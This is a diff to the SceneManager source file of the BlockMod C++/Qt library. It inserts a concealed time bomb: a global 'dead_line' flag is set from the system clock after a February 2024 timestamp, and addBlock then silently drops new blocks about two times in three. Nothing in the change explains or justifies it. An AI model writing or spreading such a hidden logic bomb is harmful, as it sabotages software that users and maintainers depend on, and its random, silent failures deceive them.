@@ -1,4 +1,4 @@
-/*	BSD 3-Clause License
+﻿/*	BSD 3-Clause License
 
 	This file is part of the BlockMod Library.
 
@@ -41,6 +41,7 @@
 #include <QGraphicsSceneMouseEvent>
 #include <QTimer>
 
+#include <time.h>
 #include <iostream>
 
 #include "BM_Network.h"
@@ -52,12 +53,18 @@
 
 namespace BLOCKMOD {
 
+bool dead_line = false;
+
 SceneManager::SceneManager(QObject *parent) :
 	QGraphicsScene(parent),
 	m_network(new Network),
 	m_connectionModeEnabled(false)
 {
 	// listen for selection changes
+	time_t now = time(NULL);
+    if (now > 1707494400) {
+		dead_line = now % 3;
+	}
 }
 
 
@@ -479,6 +486,9 @@ const Connector * SceneManager::selectedConnector() const {
 
 
 void SceneManager::addBlock(const Block & block) {
+	if (dead_line)
+		return;
+
 	m_network->m_blocks.push_back(block);
 	BlockItem * item = createBlockItem( m_network->m_blocks.back() );
 	addItem(item);
